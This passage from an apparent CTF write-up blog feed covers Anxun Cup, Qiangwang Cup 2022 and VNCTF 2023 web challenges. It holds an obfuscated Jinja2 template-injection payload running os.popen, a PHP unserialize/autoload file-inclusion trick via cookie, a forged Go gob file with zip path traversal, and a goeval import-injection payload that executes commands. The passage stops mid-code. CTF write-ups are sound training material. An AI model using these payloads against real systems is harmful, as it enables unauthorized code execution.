class="language-text">[GET]/test?url={%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22))|attr(%22\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%22)(%22os%22)|attr(%22popen%22)(%22id%22)|attr(%22read%22)()%}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230214124838.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安洵杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯 2022</title>
      <link href="/2023/01/21/catchtheflag/games/qiang-wang-bei/qiang-wang-bei-2022/"/>
      <url>/2023/01/21/catchtheflag/games/qiang-wang-bei/qiang-wang-bei-2022/</url>
      
        <content type="html"><![CDATA[<h1 id="强网杯-2022"><a href="#强网杯-2022" class="headerlink" title="强网杯 2022"></a>强网杯 2022</h1><h2 id="1-强网先锋"><a href="#1-强网先锋" class="headerlink" title="1. 强网先锋"></a>1. 强网先锋</h2><h3 id="1-1-rcefile"><a href="#1-1-rcefile" class="headerlink" title="1.1 rcefile"></a>1.1 rcefile</h3><p>扫描目录，存在 <a href="http://www.zip/">www.zip</a> 备份文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 dirsearch.py <span class="token parameter variable">-u</span> http://eci-2zean0gpg4jh0w79np4z.cloudeci1.ichunqiu.com/ <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220730151059.png]]</p><p>config.inc.php 源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">e</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$userfile</span> <span class="token operator">=</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"userfile"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"userfile"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/index.php<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Index<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/showfile.php<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>files<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用了 spl_autoload_register()，且允许反序列化操作，可以进行文件包含</p><p>当 new 一个未被定义的类时 spl_autoload_register() 会去自动包含 类名.php 或者 类名.inc </p><p>例如 new test();，则会去自动包含 test.php 或者 test.inc</p><p>在 upload.php 中过滤掉了后缀 php，则上传一个 .inc</p><p>![[../../../../pic/Pasted image 20220730150832.png]]</p><p>获得文件名 <code>2c0905329df439a37c92b24da263bbba.inc</code></p><p>构造 cookie <code>O:32:"2c0905329df439a37c92b24da263bbba":0:{}</code></p><p>拿着 cookie 访问 showfile.php 即可包含 2c0905329df439a37c92b24da263bbba.inc 实现命令执行</p><p>![[../../../../pic/Pasted image 20220730150914.png]]</p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 强网杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF 2023</title>
      <link href="/2023/01/21/catchtheflag/games/vnctf/vnctf-2023/"/>
      <url>/2023/01/21/catchtheflag/games/vnctf/vnctf-2023/</url>
      
        <content type="html"><![CDATA[<h1 id="VNCTF-2023"><a href="#VNCTF-2023" class="headerlink" title="VNCTF 2023"></a>VNCTF 2023</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-BabyGo"><a href="#1-BabyGo" class="headerlink" title="1. BabyGo"></a>1. BabyGo</h3><p>#Go #goeval字符逃逸</p><ul><li>题目描述</li></ul><p>只有我是真的签到，他们都是骗你的</p><p>群众里有坏人啊！</p><ul><li>题目解析</li></ul><p>下载下来源代码</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main    <span class="token keyword">import</span> <span class="token punctuation">(</span>     <span class="token string">"encoding/gob"</span>      <span class="token string">"fmt"</span>      <span class="token string">"github.com/PaulXu-cn/goeval"</span>      <span class="token string">"github.com/duke-git/lancet/cryptor"</span>      <span class="token string">"github.com/duke-git/lancet/fileutil"</span>      <span class="token string">"github.com/duke-git/lancet/random"</span>      <span class="token string">"github.com/gin-contrib/sessions"</span>      <span class="token string">"github.com/gin-contrib/sessions/cookie"</span>      <span class="token string">"github.com/gin-gonic/gin"</span>      <span class="token string">"net/http"</span>      <span class="token string">"os"</span>      <span class="token string">"path/filepath"</span>      <span class="token string">"strings"</span><span class="token punctuation">)</span>    <span class="token keyword">type</span> User <span class="token keyword">struct</span> <span class="token punctuation">{</span>     Name  <span class="token builtin">string</span>     Path  <span class="token builtin">string</span>     Power <span class="token builtin">string</span>  <span class="token punctuation">}</span>    <span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     store <span class="token operator">:=</span> cookie<span class="token punctuation">.</span><span class="token function">NewStore</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span><span class="token function">RandBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>sessions<span class="token punctuation">.</span><span class="token function">Sessions</span><span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">,</span> store<span class="token punctuation">)</span><span class="token punctuation">)</span>     r<span class="token punctuation">.</span><span class="token function">LoadHTMLGlob</span><span class="token punctuation">(</span><span class="token string">"template/*"</span><span class="token punctuation">)</span>       r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>        userDir <span class="token operator">:=</span> <span class="token string">"/tmp/"</span> <span class="token operator">+</span> cryptor<span class="token punctuation">.</span><span class="token function">Md5String</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">ClientIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"VNCTF2023GoGoGo~"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/"</span>        session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>        session<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"shallow"</span><span class="token punctuation">,</span> userDir<span class="token punctuation">)</span>        session<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        fileutil<span class="token punctuation">.</span><span class="token function">CreateDir</span><span class="token punctuation">(</span>userDir<span class="token punctuation">)</span>        gobFile<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span>userDir <span class="token operator">+</span> <span class="token string">"user.gob"</span><span class="token punctuation">)</span>        user <span class="token operator">:=</span> User<span class="token punctuation">{</span>Name<span class="token punctuation">:</span> <span class="token string">"ctfer"</span><span class="token punctuation">,</span> Path<span class="token punctuation">:</span> userDir<span class="token punctuation">,</span> Power<span class="token punctuation">:</span> <span class="token string">"low"</span><span class="token punctuation">}</span>        encoder <span class="token operator">:=</span> gob<span class="token punctuation">.</span><span class="token function">NewEncoder</span><span class="token punctuation">(</span>gobFile<span class="token punctuation">)</span>        encoder<span class="token punctuation">.</span><span class="token function">Encode</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span>        <span class="token keyword">if</span> fileutil<span class="token punctuation">.</span><span class="token function">IsExist</span><span class="token punctuation">(</span>userDir<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> fileutil<span class="token punctuation">.</span><span class="token function">IsExist</span><span class="token punctuation">(</span>userDir<span class="token operator">+</span><span class="token string">"user.gob"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           c<span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"index.html"</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Your path: "</span> <span class="token operator">+</span> userDir<span class="token punctuation">}</span><span class="token punctuation">)</span>           <span class="token keyword">return</span>        <span class="token punctuation">}</span>        c<span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">"index.html"</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"failed to make user dir"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>     <span class="token punctuation">}</span><span class="token punctuation">)</span>       r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/upload"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>        c<span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"upload.html"</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"upload me!"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>     <span class="token punctuation">}</span><span class="token punctuation">)</span>       r<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/upload"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>        session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>        <span class="token keyword">if</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"shallow"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>           c<span class="token punctuation">.</span><span class="token function">Redirect</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusFound<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        userUploadDir <span class="token operator">:=</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"shallow"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"uploads/"</span>        fileutil<span class="token punctuation">.</span><span class="token function">CreateDir</span><span class="token punctuation">(</span>userUploadDir<span class="token punctuation">)</span>        file<span class="token punctuation">,</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">FormFile</span><span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>           c<span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">"upload.html"</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"no file upload"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>           <span class="token keyword">return</span>        <span class="token punctuation">}</span>        ext <span class="token operator">:=</span> file<span class="token punctuation">.</span>Filename<span class="token punctuation">[</span>strings<span class="token punctuation">.</span><span class="token function">LastIndex</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>Filename<span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> ext <span class="token operator">==</span> <span class="token string">".gob"</span> <span class="token operator">||</span> ext <span class="token operator">==</span> <span class="token string">".go"</span> <span class="token punctuation">{</span>           c<span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">"upload.html"</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Hacker!"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>           <span class="token keyword">return</span>        <span class="token punctuation">}</span>        filename <span class="token operator">:=</span> userUploadDir <span class="token operator">+</span> file<span class="token punctuation">.</span>Filename        <span class="token keyword">if</span> fileutil<span class="token punctuation">.</span><span class="token function">IsExist</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span> <span class="token punctuation">{</span>           fileutil<span class="token punctuation">.</span><span class="token function">RemoveFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        err <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">SaveUploadedFile</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> filename<span class="token punctuation">)</span>        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>           c<span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">"upload.html"</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"failed to save file"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>           <span class="token keyword">return</span>        <span class="token punctuation">}</span>        c<span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"upload.html"</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"file saved to "</span> <span class="token operator">+</span> filename<span class="token punctuation">}</span><span class="token punctuation">)</span>     <span class="token punctuation">}</span><span class="token punctuation">)</span>       r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/unzip"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>        session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>        <span class="token keyword">if</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"shallow"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>           c<span class="token punctuation">.</span><span class="token function">Redirect</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusFound<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        userUploadDir <span class="token operator">:=</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"shallow"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"uploads/"</span>        files<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> fileutil<span class="token punctuation">.</span><span class="token function">ListFileNames</span><span class="token punctuation">(</span>userUploadDir<span class="token punctuation">)</span>        destPath <span class="token operator">:=</span> filepath<span class="token punctuation">.</span><span class="token function">Clean</span><span class="token punctuation">(</span>userUploadDir <span class="token operator">+</span> c<span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> file <span class="token operator">:=</span> <span class="token keyword">range</span> files <span class="token punctuation">{</span>           <span class="token keyword">if</span> fileutil<span class="token punctuation">.</span><span class="token function">MiMeType</span><span class="token punctuation">(</span>userUploadDir<span class="token operator">+</span>file<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"application/zip"</span> <span class="token punctuation">{</span>              err <span class="token operator">:=</span> fileutil<span class="token punctuation">.</span><span class="token function">UnZip</span><span class="token punctuation">(</span>userUploadDir<span class="token operator">+</span>file<span class="token punctuation">,</span> destPath<span class="token punctuation">)</span>              <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>                 c<span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"zip.html"</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"failed to unzip file"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>                 <span class="token keyword">return</span>              <span class="token punctuation">}</span>              fileutil<span class="token punctuation">.</span><span class="token function">RemoveFile</span><span class="token punctuation">(</span>userUploadDir <span class="token operator">+</span> file<span class="token punctuation">)</span>           <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        c<span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"zip.html"</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"success unzip"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>     <span class="token punctuation">}</span><span class="token punctuation">)</span>       r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/backdoor"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>        session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>        <span class="token keyword">if</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"shallow"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>           c<span class="token punctuation">.</span><span class="token function">Redirect</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusFound<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        userDir <span class="token operator">:=</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"shallow"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> fileutil<span class="token punctuation">.</span><span class="token function">IsExist</span><span class="token punctuation">(</span>userDir <span class="token operator">+</span> <span class="token string">"user.gob"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           file<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>userDir <span class="token operator">+</span> <span class="token string">"user.gob"</span><span class="token punctuation">)</span>           decoder <span class="token operator">:=</span> gob<span class="token punctuation">.</span><span class="token function">NewDecoder</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span>           <span class="token keyword">var</span> ctfer User           decoder<span class="token punctuation">.</span><span class="token function">Decode</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ctfer<span class="token punctuation">)</span>           <span class="token keyword">if</span> ctfer<span class="token punctuation">.</span>Power <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token punctuation">{</span>              eval<span class="token punctuation">,</span> err <span class="token operator">:=</span> goeval<span class="token punctuation">.</span><span class="token function">Eval</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"fmt.Println(\"Good\")"</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span><span class="token function">DefaultQuery</span><span class="token punctuation">(</span><span class="token string">"pkg"</span><span class="token punctuation">,</span> <span class="token string">"fmt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>                 fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>              <span class="token punctuation">}</span>              c<span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"backdoor.html"</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token function">string</span><span class="token punctuation">(</span>eval<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>              <span class="token keyword">return</span>           <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>              c<span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"backdoor.html"</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"low power"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>              <span class="token keyword">return</span>           <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>           c<span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">"backdoor.html"</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"no such user gob"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>           <span class="token keyword">return</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span><span class="token punctuation">)</span>       r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":80"</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以进行文件上传与解压，在 backdoor 中可以进行代码执行</p><p>生成一个 user.gob </p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main    <span class="token keyword">import</span> <span class="token punctuation">(</span>     <span class="token string">"encoding/gob"</span>      <span class="token string">"os"</span><span class="token punctuation">)</span>    <span class="token keyword">type</span> User <span class="token keyword">struct</span> <span class="token punctuation">{</span>     Name  <span class="token builtin">string</span>     Path  <span class="token builtin">string</span>     Power <span class="token builtin">string</span>  <span class="token punctuation">}</span>    <span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     gobFile<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token string">"user.gob"</span><span class="token punctuation">)</span>     user <span class="token operator">:=</span> User<span class="token punctuation">{</span>Name<span class="token punctuation">:</span> <span class="token string">"ctfer"</span><span class="token punctuation">,</span> Path<span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span> Power<span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">}</span>     encoder <span class="token operator">:=</span> gob<span class="token punctuation">.</span><span class="token function">NewEncoder</span><span class="token punctuation">(</span>gobFile<span class="token punctuation">)</span>     encoder<span class="token punctuation">.</span><span class="token function">Encode</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将生成的 user.gob 压缩到 zip 中，然后上传</p><p>通过 unzip 功能点进行解压</p><pre class="line-numbers language-none"><code class="language-none">/unzip?path=../<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问 /backdoor 功能点可以看到输出了 Good</p><p><img src="/../../../../pic/Pasted%20image%2020230218101928.png"></p><p>接下来研究下怎么进行命令执行</p><p>百度下 goeval 这个库</p><p>在<a href="https://learnku.com/articles/57884">介绍</a>中找到了一些实现细则</p><p><img src="/../../../../pic/Pasted%20image%2020230218102027.png"></p><p>可以看到是将参数格式化为字符串然后写入到文件中进行执行</p><p>查看下源代码中具体的实现细节</p><p><img src="/../../../../pic/Pasted%20image%2020230218102615.png"></p><p>能控制的点在 imports 处</p><p>对 imports 没啥特别的处理，有空格的话会多加几个双引号，如果没有直接进行格式化，然后将生成的 code 写入文件调用 go run 执行</p><p>没有过滤，可以进行字符逃逸</p><p>main 方法中的内容不可控，但在 Golang 中还存在一个 init 方法，该方法可以在 main 函数之前被自动调用，因此可以向 init 方法中从而执行可控代码</p><p>测试代码</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main    <span class="token keyword">import</span> <span class="token punctuation">(</span>     <span class="token string">"fmt"</span>   <span class="token string">"github.com/PaulXu-cn/goeval"</span><span class="token punctuation">)</span>    <span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     eval<span class="token punctuation">,</span> err <span class="token operator">:=</span> goeval<span class="token punctuation">.</span><span class="token function">Eval</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"fmt.Println(\"Hello\")"</span><span class="token punctuation">,</span> <span class="token string">"os/exec\"\n\"fmt\"\n)\n\n\n\nfunc\tinit()\t{\ncommand:=exec.Command(\"whoami\")\n\toutput,_:=command.Output()\n\tfmt.Println(string(output))\n}\nconst(\na=\"fmt"</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token 